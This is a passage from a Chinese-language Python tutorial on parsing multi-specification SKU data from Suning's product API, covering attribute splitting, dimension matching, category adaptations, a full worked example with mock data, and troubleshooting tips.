    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"原始：<span class="hljs-subst">{attr}</span> → 拆分：<span class="hljs-subst">{split_sku_attr(attr)}</span>"</span>)
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 原始：黑色+12GB+256GB → 拆分：['黑色', '12GB', '256GB']</span>
<span class="hljs-comment"># 原始：白色/512GB → 拆分：['白色', '512GB']</span>
<span class="hljs-comment"># 原始：蓝色 | 8GB | 128GB → 拆分：['蓝色', '8GB', '128GB']</span>
<span class="hljs-comment"># 原始：红色；256GB → 拆分：['红色', '256GB']</span>
</code></pre>
<h4 data-id="heading-8">2. 规格维度自动匹配（核心技巧）</h4>
<p>拆分后的属性值需匹配到具体维度（如颜色、内存、存储、尺寸等），需结合<code>attributeInfo</code>中的静态属性维度实现自动匹配：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">match_sku_attr_dimension</span>(<span class="hljs-params">sku_attr_list: <span class="hljs-built_in">list</span>, product_attr_list: <span class="hljs-built_in">list</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""
    将SKU属性值匹配到具体维度（如颜色、存储）
    :param sku_attr_list: 拆分后的SKU属性值列表
    :param product_attr_list: 商品静态属性列表（来自attributeInfo）
    :return: 维度→属性值的字典
    """</span>
    <span class="hljs-comment"># 步骤1：提取商品静态属性的维度（如机身颜色、存储容量）</span>
    attr_dimensions = {}
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> product_attr_list:
        attr_name = attr.get(<span class="hljs-string">"attrName"</span>, <span class="hljs-string">""</span>).strip()
        attr_value = attr.get(<span class="hljs-string">"attrValue"</span>, <span class="hljs-string">""</span>).strip()
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> attr_name <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> attr_value:
            <span class="hljs-keyword">continue</span>
        <span class="hljs-comment"># 标准化维度名称（统一关键词）</span>
        std_dim = <span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"颜色"</span> <span class="hljs-keyword">in</span> attr_name:
            std_dim = <span class="hljs-string">"颜色"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"内存"</span> <span class="hljs-keyword">in</span> attr_name <span class="hljs-keyword">or</span> <span class="hljs-string">"运行内存"</span> <span class="hljs-keyword">in</span> attr_name:
            std_dim = <span class="hljs-string">"内存"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"存储"</span> <span class="hljs-keyword">in</span> attr_name <span class="hljs-keyword">or</span> <span class="hljs-string">"容量"</span> <span class="hljs-keyword">in</span> attr_name <span class="hljs-keyword">and</span> <span class="hljs-string">"GB"</span> <span class="hljs-keyword">in</span> attr_value:
            std_dim = <span class="hljs-string">"存储"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"尺寸"</span> <span class="hljs-keyword">in</span> attr_name <span class="hljs-keyword">or</span> <span class="hljs-string">"尺码"</span> <span class="hljs-keyword">in</span> attr_name:
            std_dim = <span class="hljs-string">"尺寸"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"功率"</span> <span class="hljs-keyword">in</span> attr_name:
            std_dim = <span class="hljs-string">"功率"</span>
        <span class="hljs-keyword">if</span> std_dim:
            <span class="hljs-comment"># 提取该维度的所有可选值（如黑色;白色;蓝色→["黑色","白色","蓝色"]）</span>
            attr_dimensions[std_dim] = [v.strip() <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> attr_value.split(<span class="hljs-string">";"</span>)]
    
    <span class="hljs-comment"># 步骤2：将SKU属性值匹配到标准化维度</span>
    sku_attr_dict = {}
    <span class="hljs-keyword">for</span> attr_value <span class="hljs-keyword">in</span> sku_attr_list:
        matched = <span class="hljs-literal">False</span>
        <span class="hljs-keyword">for</span> dim, dim_values <span class="hljs-keyword">in</span> attr_dimensions.items():
            <span class="hljs-keyword">if</span> attr_value <span class="hljs-keyword">in</span> dim_values:
                sku_attr_dict[dim] = attr_value
                matched = <span class="hljs-literal">True</span>
                <span class="hljs-keyword">break</span>
        <span class="hljs-comment"># 未匹配到预设维度时，自动识别（如含GB的是存储/内存，颜色关键词）</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> matched:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"GB"</span> <span class="hljs-keyword">in</span> attr_value:
                <span class="hljs-keyword">if</span> attr_value <span class="hljs-keyword">in</span> [<span class="hljs-string">"8GB"</span>, <span class="hljs-string">"12GB"</span>, <span class="hljs-string">"16GB"</span>]:
                    sku_attr_dict[<span class="hljs-string">"内存"</span>] = attr_value
                <span class="hljs-keyword">else</span>:
                    sku_attr_dict[<span class="hljs-string">"存储"</span>] = attr_value
            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">any</span>(color <span class="hljs-keyword">in</span> attr_value <span class="hljs-keyword">for</span> color <span class="hljs-keyword">in</span> [<span class="hljs-string">"黑色"</span>, <span class="hljs-string">"白色"</span>, <span class="hljs-string">"红色"</span>, <span class="hljs-string">"蓝色"</span>, <span class="hljs-string">"绿色"</span>]):
                sku_attr_dict[<span class="hljs-string">"颜色"</span>] = attr_value
            <span class="hljs-keyword">else</span>:
                sku_attr_dict[<span class="hljs-string">"其他规格"</span>] = attr_value
    <span class="hljs-keyword">return</span> sku_attr_dict

<span class="hljs-comment"># 测试维度匹配</span>
product_attr_list = [
    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"机身颜色"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"黑色;白色;蓝色"</span>},
    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"存储容量"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"256GB;512GB;1TB"</span>},
    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"运行内存"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"8GB;12GB;16GB"</span>}
]
sku_attr_list = [<span class="hljs-string">"黑色"</span>, <span class="hljs-string">"12GB"</span>, <span class="hljs-string">"256GB"</span>]
<span class="hljs-built_in">print</span>(match_sku_attr_dimension(sku_attr_list, product_attr_list))
<span class="hljs-comment"># 输出：{'颜色': '黑色', '内存': '12GB', '存储': '256GB'}</span>
</code></pre>
<h4 data-id="heading-9">3. 特殊品类适配（服饰 / 家电）</h4>
<h5 data-id="heading-10">3.1 服饰类（尺码 / 颜色为主）</h5>
<p>服饰类<code>skuAttr</code>常为「颜色 - 尺码」格式（如 "黑色 - L 码"），需适配尺码维度识别：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">adapt_clothing_sku_attr</span>(<span class="hljs-params">sku_attr_list: <span class="hljs-built_in">list</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""适配服饰类SKU属性解析"""</span>
    size_keywords = [<span class="hljs-string">"XS"</span>, <span class="hljs-string">"S"</span>, <span class="hljs-string">"M"</span>, <span class="hljs-string">"L"</span>, <span class="hljs-string">"XL"</span>, <span class="hljs-string">"XXL"</span>, <span class="hljs-string">"XXXL"</span>, <span class="hljs-string">"码"</span>, <span class="hljs-string">"号"</span>]
    color_keywords = [<span class="hljs-string">"黑"</span>, <span class="hljs-string">"白"</span>, <span class="hljs-string">"红"</span>, <span class="hljs-string">"蓝"</span>, <span class="hljs-string">"绿"</span>, <span class="hljs-string">"粉"</span>, <span class="hljs-string">"黄"</span>, <span class="hljs-string">"紫"</span>]
    
    sku_attr_dict = {}
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> sku_attr_list:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> attr <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> size_keywords):
            sku_attr_dict[<span class="hljs-string">"尺码"</span>] = attr
        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> attr <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> color_keywords):
            sku_attr_dict[<span class="hljs-string">"颜色"</span>] = attr
        <span class="hljs-keyword">else</span>:
            sku_attr_dict[<span class="hljs-string">"版型"</span>] = attr  <span class="hljs-comment"># 如宽松、修身</span>
    <span class="hljs-keyword">return</span> sku_attr_dict

<span class="hljs-comment"># 测试服饰适配</span>
clothing_attr_list = [<span class="hljs-string">"黑色"</span>, <span class="hljs-string">"XL码"</span>]
<span class="hljs-built_in">print</span>(adapt_clothing_sku_attr(clothing_attr_list))  <span class="hljs-comment"># {'颜色': '黑色', '尺码': 'XL码'}</span>
</code></pre>
<h5 data-id="heading-11">3.2 家电类（功率 / 尺寸为主）</h5>
<p>家电类<code>skuAttr</code>含功率、尺寸等数值型属性，需标准化单位：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">adapt_appliance_sku_attr</span>(<span class="hljs-params">sku_attr_list: <span class="hljs-built_in">list</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""适配家电类SKU属性解析"""</span>
    sku_attr_dict = {}
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> sku_attr_list:
        <span class="hljs-keyword">if</span> <span class="hljs-string">"W"</span> <span class="hljs-keyword">in</span> attr <span class="hljs-keyword">or</span> <span class="hljs-string">"千瓦"</span> <span class="hljs-keyword">in</span> attr:
            <span class="hljs-comment"># 统一单位为W（如"1.5千瓦"→"1500W"）</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"千瓦"</span> <span class="hljs-keyword">in</span> attr:
                kw = <span class="hljs-built_in">float</span>(attr.replace(<span class="hljs-string">"千瓦"</span>, <span class="hljs-string">""</span>).strip())
                attr = <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">int</span>(kw*<span class="hljs-number">1000</span>)}</span>W"</span>
            sku_attr_dict[<span class="hljs-string">"功率"</span>] = attr
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"mm"</span> <span class="hljs-keyword">in</span> attr <span class="hljs-keyword">or</span> <span class="hljs-string">"cm"</span> <span class="hljs-keyword">in</span> attr:
            <span class="hljs-comment"># 统一单位为mm（如"60cm"→"600mm"）</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"cm"</span> <span class="hljs-keyword">in</span> attr:
                cm = <span class="hljs-built_in">float</span>(attr.replace(<span class="hljs-string">"cm"</span>, <span class="hljs-string">""</span>).strip())
                attr = <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">int</span>(cm*<span class="hljs-number">10</span>)}</span>mm"</span>
            sku_attr_dict[<span class="hljs-string">"尺寸"</span>] = attr
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"升"</span> <span class="hljs-keyword">in</span> attr:
            sku_attr_dict[<span class="hljs-string">"容量"</span>] = attr
    <span class="hljs-keyword">return</span> sku_attr_dict

<span class="hljs-comment"># 测试家电适配</span>
appliance_attr_list = [<span class="hljs-string">"1.5千瓦"</span>, <span class="hljs-string">"60cm"</span>]
<span class="hljs-built_in">print</span>(adapt_appliance_sku_attr(appliance_attr_list))  <span class="hljs-comment"># {'功率': '1500W', '尺寸': '600mm'}</span>
</code></pre>
<h3 data-id="heading-12">四、完整解析实战（多规格商品）</h3>
<h4 data-id="heading-13">1. 全流程解析函数</h4>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_extract_field</span>(<span class="hljs-params">data: <span class="hljs-type">Dict</span>, field_path: <span class="hljs-built_in">str</span>, default: <span class="hljs-built_in">any</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">any</span>:
    <span class="hljs-string">"""安全提取嵌套字段"""</span>
    keys = field_path.split(<span class="hljs-string">"."</span>)
    value = data
    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> key <span class="hljs-keyword">in</span> value:
            value = value[key]
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> default
    <span class="hljs-keyword">return</span> value

<span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_suning_multi_sku_product</span>(<span class="hljs-params">raw_api_data: <span class="hljs-type">Dict</span></span>) -&gt; <span class="hljs-type">Dict</span>:
    <span class="hljs-string">"""
    全流程解析苏宁多规格商品API数据
    :param raw_api_data: API原始响应数据
    :return: 标准化的多规格商品数据
    """</span>
    <span class="hljs-comment"># 1. 提取基础信息</span>
    product_code = safe_extract_field(raw_api_data, <span class="hljs-string">"body.productInfo.productCode"</span>, <span class="hljs-string">""</span>)
    product_name = safe_extract_field(raw_api_data, <span class="hljs-string">"body.productInfo.productName"</span>, <span class="hljs-string">""</span>)
    product_price = <span class="hljs-built_in">float</span>(safe_extract_field(raw_api_data, <span class="hljs-string">"body.priceInfo.salePrice"</span>, <span class="hljs-number">0.0</span>))
    product_stock = safe_extract_field(raw_api_data, <span class="hljs-string">"body.stockInfo.stockCount"</span>, <span class="hljs-number">0</span>)
    <span class="hljs-comment"># 处理商品主库存格式</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(product_stock, <span class="hljs-built_in">str</span>):
        product_stock = <span class="hljs-built_in">int</span>(product_stock.replace(<span class="hljs-string">"+"</span>, <span class="hljs-string">""</span>)) <span class="hljs-keyword">if</span> <span class="hljs-string">"+"</span> <span class="hljs-keyword">in</span> product_stock <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>

    <span class="hljs-comment"># 2. 提取商品静态属性列表</span>
    product_attr_list = safe_extract_field(raw_api_data, <span class="hljs-string">"body.attributeInfo.attributeList"</span>, [])

    <span class="hljs-comment"># 3. 提取SKU列表并解析</span>
    sku_list = safe_extract_field(raw_api_data, <span class="hljs-string">"body.skuInfo.skuList"</span>, [])
    parsed_skus = []
    <span class="hljs-keyword">for</span> sku <span class="hljs-keyword">in</span> sku_list:
        sku_code = sku.get(<span class="hljs-string">"skuCode"</span>, <span class="hljs-string">""</span>)
        sku_attr_str = sku.get(<span class="hljs-string">"skuAttr"</span>, <span class="hljs-string">""</span>)
        
        <span class="hljs-comment"># 验证SKU与商品主ID的关联</span>
        is_related = verify_sku_product_relation(product_code, sku_code)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_related:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"SKU <span class="hljs-subst">{sku_code}</span> 与商品 <span class="hljs-subst">{product_code}</span> 无关联，跳过"</span>)
            <span class="hljs-keyword">continue</span>
        
        <span class="hljs-comment"># 拆分SKU属性</span>
        sku_attr_list = split_sku_attr(sku_attr_str)
        
        <span class="hljs-comment"># 匹配属性维度（优先用商品静态属性，无则自动识别）</span>
        sku_attr_dict = match_sku_attr_dimension(sku_attr_list, product_attr_list)
        <span class="hljs-comment"># 适配特殊品类（可根据商品类目选择适配函数）</span>
        category_name = safe_extract_field(raw_api_data, <span class="hljs-string">"body.productInfo.categoryName"</span>, <span class="hljs-string">""</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"服饰"</span> <span class="hljs-keyword">in</span> category_name:
            sku_attr_dict = adapt_clothing_sku_attr(sku_attr_list)
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"家电"</span> <span class="hljs-keyword">in</span> category_name <span class="hljs-keyword">or</span> <span class="hljs-string">"电器"</span> <span class="hljs-keyword">in</span> category_name:
            sku_attr_dict = adapt_appliance_sku_attr(sku_attr_list)
        
        <span class="hljs-comment"># 获取SKU有效价格和库存</span>
        sku_effective_price = get_sku_effective_price(sku, product_price)
        sku_effective_stock = get_sku_effective_stock(sku, product_stock)
        
        <span class="hljs-comment"># 组装SKU解析结果</span>
        parsed_sku = {
            <span class="hljs-string">"SKU编码"</span>: sku_code,
            <span class="hljs-string">"关联商品主ID"</span>: product_code,
            <span class="hljs-string">"属性维度"</span>: sku_attr_dict,
            <span class="hljs-string">"原始属性字符串"</span>: sku_attr_str,
            <span class="hljs-string">"有效售价(元)"</span>: <span class="hljs-built_in">round</span>(sku_effective_price, <span class="hljs-number">2</span>),
            <span class="hljs-string">"有效库存数"</span>: sku_effective_stock,
            <span class="hljs-string">"SKU状态"</span>: <span class="hljs-string">"可售"</span> <span class="hljs-keyword">if</span> sku.get(<span class="hljs-string">"skuStatus"</span>) == <span class="hljs-string">"1"</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"不可售"</span>
        }
        parsed_skus.append(parsed_sku)

    <span class="hljs-comment"># 4. 组装最终结果</span>
    final_result = {
        <span class="hljs-string">"商品主信息"</span>: {
            <span class="hljs-string">"商品主ID"</span>: product_code,
            <span class="hljs-string">"商品名称"</span>: product_name,
            <span class="hljs-string">"商品主售价(元)"</span>: <span class="hljs-built_in">round</span>(product_price, <span class="hljs-number">2</span>),
            <span class="hljs-string">"商品主库存数"</span>: product_stock,
            <span class="hljs-string">"是否多规格"</span>: <span class="hljs-built_in">len</span>(parsed_skus) &gt; <span class="hljs-number">1</span>
        },
        <span class="hljs-string">"SKU列表"</span>: parsed_skus,
        <span class="hljs-string">"静态属性列表"</span>: product_attr_list
    }
    <span class="hljs-keyword">return</span> final_result

<span class="hljs-comment"># 2. 测试实战（模拟苏宁API返回数据）</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># 模拟多规格手机商品API响应</span>
    mock_raw_data = {
        <span class="hljs-string">"code"</span>: <span class="hljs-string">"0000"</span>,
        <span class="hljs-string">"msg"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"body"</span>: {
            <span class="hljs-string">"productInfo"</span>: {
                <span class="hljs-string">"productCode"</span>: <span class="hljs-string">"100032189765"</span>,
                <span class="hljs-string">"productName"</span>: <span class="hljs-string">"小米14 5G手机【多规格】"</span>,
                <span class="hljs-string">"categoryName"</span>: <span class="hljs-string">"数码家电-手机通讯-5G手机"</span>
            },
            <span class="hljs-string">"priceInfo"</span>: {
                <span class="hljs-string">"salePrice"</span>: <span class="hljs-number">3999.0</span>
            },
            <span class="hljs-string">"stockInfo"</span>: {
                <span class="hljs-string">"stockCount"</span>: <span class="hljs-string">"500+"</span>
            },
            <span class="hljs-string">"skuInfo"</span>: {
                <span class="hljs-string">"skuList"</span>: [
                    {
                        <span class="hljs-string">"skuCode"</span>: <span class="hljs-string">"10003218976512"</span>,
                        <span class="hljs-string">"skuAttr"</span>: <span class="hljs-string">"黑色+12GB+256GB"</span>,
                        <span class="hljs-string">"salePrice"</span>: <span class="hljs-number">3999.0</span>,
                        <span class="hljs-string">"stockCount"</span>: <span class="hljs-string">"200+"</span>,
                        <span class="hljs-string">"skuStatus"</span>: <span class="hljs-string">"1"</span>
                    },
                    {
                        <span class="hljs-string">"skuCode"</span>: <span class="hljs-string">"10003218976513"</span>,
                        <span class="hljs-string">"skuAttr"</span>: <span class="hljs-string">"白色/12GB/512GB"</span>,
                        <span class="hljs-string">"salePrice"</span>: <span class="hljs-number">4299.0</span>,
                        <span class="hljs-string">"stockCount"</span>: <span class="hljs-number">150</span>,
                        <span class="hljs-string">"skuStatus"</span>: <span class="hljs-string">"1"</span>
                    },
                    {
                        <span class="hljs-string">"skuCode"</span>: <span class="hljs-string">"10003218988814"</span>,  <span class="hljs-comment"># 无效SKU（无关联）</span>
                        <span class="hljs-string">"skuAttr"</span>: <span class="hljs-string">"蓝色+16GB+1TB"</span>,
                        <span class="hljs-string">"salePrice"</span>: <span class="hljs-number">4999.0</span>,
                        <span class="hljs-string">"stockCount"</span>: <span class="hljs-number">100</span>,
                        <span class="hljs-string">"skuStatus"</span>: <span class="hljs-string">"1"</span>
                    }
                ]
            },
            <span class="hljs-string">"attributeInfo"</span>: {
                <span class="hljs-string">"attributeList"</span>: [
                    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"机身颜色"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"黑色;白色;蓝色"</span>},
                    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"运行内存"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"8GB;12GB;16GB"</span>},
                    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"存储容量"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"256GB;512GB;1TB"</span>}
                ]
            }
        }
    }

    <span class="hljs-comment"># 全流程解析</span>
    parsed_result = parse_suning_multi_sku_product(mock_raw_data)
    <span class="hljs-comment"># 格式化输出</span>
    <span class="hljs-built_in">print</span>(json.dumps(parsed_result, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">2</span>))
</code></pre>
<h4 data-id="heading-14">2. 解析结果输出</h4>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"商品主信息"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"商品主ID"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100032189765"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"商品名称"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"小米14 5G手机【多规格】"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"商品主售价(元)"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3999.0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"商品主库存数"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">500</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"是否多规格"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"SKU列表"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"SKU编码"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"10003218976512"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"关联商品主ID"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100032189765"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"属性维度"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"颜色"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"内存"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"12GB"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"存储"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"256GB"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"原始属性字符串"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色+12GB+256GB"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"有效售价(元)"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3999.0</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"有效库存数"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">200</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"SKU状态"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"可售"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"SKU编码"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"10003218976513"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"关联商品主ID"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100032189765"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"属性维度"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"颜色"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"白色"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"内存"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"12GB"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"存储"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"512GB"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"原始属性字符串"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"白色/12GB/512GB"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"有效售价(元)"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4299.0</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"有效库存数"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">150</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"SKU状态"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"可售"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"静态属性列表"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"机身颜色"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色;白色;蓝色"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"运行内存"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"8GB;12GB;16GB"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"存储容量"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"256GB;512GB;1TB"</span><span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-15">五、避坑指南与优化建议</h3>
<h4 data-id="heading-16">1. 常见解析问题及解决方案</h4>



































<table><thead><tr><th>问题类型</th><th>表现形式</th><th>解决方案</th></tr></thead><tbody><tr><td>SKU 编码无关联</td><td>SKU 编码不以商品主 ID 为前缀</td><td>过滤无效 SKU，记录异常 SKU 编码用于核查</td></tr><tr><td>属性值匹配失败</td><td>拆分后的属性值无对应维度</td><td>新增「其他规格」维度兜底，避免字段缺失</td></tr><tr><td>单位格式混乱</td><td>功率有 "W"、"千瓦"，尺寸有 "cm"、"mm"</td><td>统一单位（如功率→W，尺寸→mm）</td></tr><tr><td>部分 SKU 无价格 / 库存</td><td>SKU 售价为 0 或库存为空</td><td>用商品主价格 / 库存兜底，并标记「数据异常」</td></tr><tr><td>特殊字符干扰</td><td>SKU 属性含 emoji、特殊符号（如🔥）</td><td>正则过滤非中文 / 数字 / 字母字符：<code>re.sub(r'[^\u4e00-\u9fa50-9A-Za-zGBW]+', '', attr)</code></td></tr></tbody></table>
<h4 data-id="heading-17">2. 性能优化建议</h4>
<ul>
<li><strong>缓存维度映射</strong>：将商品类目→规格维度的映射关系缓存（如手机→[颜色、内存、存储]），避免重复解析；</li>
<li><strong>批量解析</strong>：批量处理多商品时，先提取所有 SKU 属性格式，统一适配分隔符，提升解析效率；</li>
<li><strong>异步解析</strong>：使用<code>aiohttp</code>异步调用 API，结合多进程解析 SKU 属性，适配万级商品批量解析。</li>
</ul>
<h4 data-id="heading-18">3. 合规与稳定性建议</h4>
<ul>
<li><strong>异常日志</strong>：记录解析失败的 SKU 编码、属性字符串，便于后续排查；</li>
<li><strong>版本兼容</strong>：苏宁 API 版本更新时，优先适配<code>skuAttr</code>和<code>attributeInfo</code>字段的格式变化；</li>
<li><strong>数据校验</strong>：解析后校验 SKU 数量、价格范围（如售价不能为负），过滤无效数据。</li>
</ul>
<h3 data-id="heading-19">六、总结</h3>
<p>苏宁多规格商品 API 解析的核心是「<strong>关联验证 + 多格式适配 + 维度标准化</strong>」：</p>
<ol>
<li>关联验证：通过 SKU 编码前缀规则验证 SKU 与商品主 ID 的关联，过滤无效数据；</li>
<li>多格式适配：兼容不同分隔符、不同品类的属性格式，解决解析碎片化问题；</li>
<li>维度标准化：将属性值匹配到统一维度（颜色、内存、存储等），并标准化单位，适配下游业务场景。</li>
</ol>
